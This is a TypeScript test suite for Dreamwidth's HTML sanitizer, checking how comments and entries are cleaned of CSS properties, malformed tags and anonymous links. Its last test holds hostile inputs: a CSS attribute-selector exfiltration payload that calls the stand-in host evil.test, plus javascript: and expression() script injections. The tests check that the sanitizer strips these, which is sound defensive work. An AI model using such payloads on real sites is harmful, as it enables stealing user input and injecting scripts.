// comment.test.ts
//
// Comment cleaning and external resources, from t/cleaner-comment.t and
// t/cleaner-resource-loading.t.
//
// Authors:
//      Dreamwidth contributors
//
// Copyright (c) 2026 by Dreamwidth Studios, LLC.
//
// This program is free software; you may redistribute it and/or modify it under
// the same terms as Perl itself. For a copy of the license, please reference
// 'perldoc perlartistic' or 'perldoc perlgpl'.

import assert from "node:assert/strict";
import { test } from "node:test";
import { cleanComment, cleanEvent } from "../index";
import { site } from "./site";

const comment = (text: string, anonymous = false) => cleanComment(text, { anonymous }, site);
const event = (text: string) => cleanEvent(text, {}, site);

// [name, input, expected output, anonymous]
const cases: [string, string, string | RegExp, boolean?][] = [
    ["display:none removed", '<span style="display: none; display:none; display : none; display: inline">',
        /^<span style="\s*display: inline\s*"><\/span>$/],
    ["margin removed", '<span style="margin-top: 10px;">', /^<span style="\s*"><\/span>$/],
    ["height removed", '<span style="height: 150px;">', /^<span style="\s*"><\/span>$/],
    ["large padding removed",
        '<span style="padding-top: 9999999px; padding-left: 9999999px; padding-top: 9999999px; padding-bottom: 9999999px"></span>',
        /^<span style="\s*"><\/span>$/],
    ["large combined padding removed", '<span style="padding: 999px 999px 999px 999px"></span>', /^<span style="\s*"><\/span>$/],
    ["all padding removed when any is too large", '<span style="padding-left: 999px; padding-right: 200px;"></span>',
        /^<span style="\s*"><\/span>$/],
    ["combined padding removed when one side is too large", '<span style="padding: 999px 200px;"></span>',
        /^<span style="\s*"><\/span>$/],
    ["reasonable padding kept",
        '<span style="padding-top: 200px; padding-left: 200px; padding-right: 150px; padding-bottom: 150px;"></span>',
        /^<span style="\s*padding-top: 200px;\s*padding-left: 200px;\s*padding-right: 150px;\s*padding-bottom: 150px;\s*"><\/span>$/],
    ["font tag closed", '<font color="red">test', '<font color="red">test</font>'],
    ["spurious closing div stripped", '<font color="red"></div>test', '<font color="red">test</font>'],
    ["closing div inserted", '<font color="red"><div>test</font>', '<font color="red"><div>test</div></font>'],
    ["bad open and close fixed", '<div><font color="red"></div>test</font>', '<div><font color="red"></font></div>test'],
    ["headers closed aggressively", "<h1><h2><h3><h1><h2><h3>", "<h1><h2><h3><h1><h2><h3></h3></h2></h1></h3></h2></h1>"],
    ["extra closes eaten", "<h1><h2><h3><h1></h2><h2></h3><h3>", "<h1><h2><h3><h1></h1></h3></h2><h2><h3></h3></h2></h1>"],
    ["anonymous: relative font sizes kept", '<span style="font-size: larger">foo</span>',
        '<span style="font-size: larger">foo</span>', true],
    ["anonymous: absolute font sizes removed", '<span style="font-size:   10px  ">foo</span>', '<span style="">foo</span>', true],
    ["anonymous: absolute font size removed from several rules", '<span style="font-size:0.2em; font-weight: bold">foo</span>',
        '<span style=" font-weight: bold">foo</span>', true],
    ["relative font sizes kept", '<span style="font-size: larger">foo</span>', '<span style="font-size: larger">foo</span>'],
    ["absolute font sizes kept", '<span style="font-size:   10px  ">foo</span>', '<span style="font-size:   10px  ">foo</span>'],
    ["several font rules kept", '<span style="font-size:0.2em; font-weight: bold">foo</span>',
        '<span style="font-size:0.2em; font-weight: bold">foo</span>'],
    ["background URL kept", `<span style="background: url('http://www.example.com/example.gif');"></span>`,
        /^<span style="\s*background: url\(&#39;http:\/\/www.example.com\/example.gif&#39;\);\s*"><\/span>$/],
    ["anonymous: background URL removed", `<span style="background: url('http://www.example.com/example.gif');"></span>`,
        /^<span style="background:\s*;\s*"><\/span>$/, true],
    ["anonymous: link shown as text", 'pre<a href="asdf"> post', "pre<b> post</b> (asdf)", true],
    ["anonymous: empty link shown as text", 'pre<a href=""> post', "pre<b> post</b> ()", true],
    ["anonymous: table after a link", "<a href=mailto:blah@blah.com><table>", "<b></b> (mailto:blah@blah.com)", true],
    ["em allowed", "<em>abc</em>", "<em>abc</em>"],
    ["marquee not allowed", "<marquee>abc</marquee>", "abc"],
    ["blink not allowed", "<blink>abc</blink>", "abc"],
];

for (const [name, input, expected, anonymous] of cases) {
    test(name, () => {
        const output = comment(input, anonymous);
        if (expected instanceof RegExp) assert.match(output, expected);
        else assert.equal(output, expected);
    });
}

for (const [label, clean] of [["event", event], ["comment", comment]] as const) {
    test(`${label}: style blocks and script CSS are removed`, () => {
        const style = clean("<style>input[value^=x]{background:url(https://evil.test/leak)}</style>");
        assert.doesNotMatch(style, /<\s*style/i);
        assert.doesNotMatch(style, /evil\.test/);
        assert.doesNotMatch(clean('<div style="background:url(javascript:alert(1))">x</div>'), /javascript/i);
        assert.doesNotMatch(clean('<div style="width:expression(alert(1))">x</div>'), /expression/i);
    });

    test(`${label}: external images and CSS urls pass through`, () => {
        assert.match(clean('<img src="https://example.com/pic.gif">'), /src="https:\/\/example\.com\/pic\.gif"/);
        assert.match(clean('<div style="background:url(https://example.com/bg.png)">x</div>'),
            /url\(\s*["']?https:\/\/example\.com\/bg\.png/i);
    });
}
